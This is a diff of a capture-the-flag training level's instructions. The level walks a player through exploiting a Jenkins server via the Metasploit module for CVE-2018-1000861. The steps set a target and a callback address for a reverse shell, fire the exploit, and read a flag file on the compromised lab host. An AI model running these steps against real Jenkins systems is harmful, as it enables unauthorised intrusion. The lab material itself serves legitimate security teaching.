@@ -10,74 +10,51 @@ The blueprint we want is on the Jenkins host at:
     /var/m0use/blueprint.txt
 
 Your job: use the metasploit module for this CVE to pop a shell on
-the Jenkins box, read that file, and submit the flag from inside.
+the Jenkins box, read that file, and submit the flag.
 
 
-THE METASPLOIT WORKFLOW
-───────────────────────
-Same pattern for any CVE you'll ever exploit with metasploit:
+YOUR WALK
+─────────
+We've preloaded the module and your callback address for this
+engagement, so you only have to do the parts that matter -- point
+at the target and fire. Five commands:
 
-    1. search        find the module by CVE id
-    2. use           select it
-    3. show options  see what params it needs
-    4. set RHOSTS    point it at the target
-    5. set LHOST     your callback address (for the reverse shell)
-    6. check         confirm the target is actually vulnerable
-    7. exploit       fire it; if it works, you get a shell
+    1.  msfconsole
+    2.  set RHOSTS 10.4.12.1
+    3.  exploit
+    4.  cat /var/m0use/blueprint.txt
+    5.  exit
+
+Step 1 enters metasploit. The prompt changes to:
+
+    msf6 exploit(multi/http/jenkins_metaprogramming) >
+
+Step 2 tells metasploit where the target is. Step 3 fires it --
+metasploit runs a check first, then sends the payload, then opens
+a reverse shell. The prompt goes blank: you're now typing as the
+jenkins user on the Jenkins box.
+
+Step 4 reads the blueprint. The flag is on the line that starts
+with "Flag:" -- copy the value from inside m0use{...}.
+
+Step 5 closes the session and leaves metasploit. You're back at
+the m0usenet prompt. Type the flag value (no m0use{...} wrap, no
+keyword, just the value) and hit Enter.
 
 
-YOUR FIRST RUN
-──────────────
-Start metasploit:
+THE BIG PICTURE
+───────────────
+For context: the full metasploit pattern, for any CVE you'll ever
+exploit with it, is:
 
-    msfconsole
+    search        find the module by CVE id
+    use           select it
+    show options  see what params it needs
+    set           fill in params (target, callback, etc.)
+    check         confirm vulnerability before firing
+    exploit       fire it; if it works, you get a shell
 
-That drops you into the metasploit REPL. The prompt changes from
-your normal shell prompt to:
-
-    msf6 >
-
-Now look up the module for CVE-2018-1000861:
-
-    search CVE-2018-1000861
-
-It'll show one matching module. Load it:
-
-    use 0
-
-The prompt now shows which module you're in. Check what options
-it needs:
-
-    show options
-
-You'll see RHOSTS (target host) and LHOST (your callback) are
-required and empty. Set them:
-
-    set RHOSTS 10.4.12.1
-    set LHOST 10.4.12.99
-
-Confirm the target is actually vulnerable before firing:
-
-    check
-
-If check returns "The target is vulnerable", fire:
-
-    exploit
-
-Metasploit sends the payload, opens a reverse shell back to you,
-and drops you onto the target. The prompt goes blank -- you're now
-typing commands AS the jenkins user on the Jenkins box.
-
-Read the blueprint:
-
-    cat /var/m0use/blueprint.txt
-
-The flag is in the file's text. When you have it, type:
-
-    exit
-
-That returns you to the msfconsole prompt. Type `exit` again to
-leave metasploit entirely. Then type the flag at the m0usenet
-prompt to advance.
+We did search/use/show/check for you. You did set + exploit. Same
+muscles, fewer reps.
 
 Stuck?  cat hint  -- no penalty.
